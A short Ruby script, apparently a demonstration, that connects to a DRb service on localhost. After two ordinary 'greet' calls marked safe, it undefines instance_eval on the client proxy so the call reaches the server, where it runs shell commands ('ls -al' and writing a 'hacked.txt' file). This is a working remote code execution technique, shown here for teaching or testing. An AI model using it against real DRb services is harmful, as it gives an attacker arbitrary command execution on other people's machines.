# frozen_string_literal: true

require 'drb/drb'
DRb.start_service
remote = DRbObject.new_with_uri('druby://localhost:9999')

# This is SAFE
remote.greet('Soumya')
remote.greet('Ray')

# This is DANGEROUS!
class << remote
  undef :instance_eval
end

puts remote.instance_eval('`ls -al`')
remote.instance_eval('`echo knock knock > hacked.txt`')
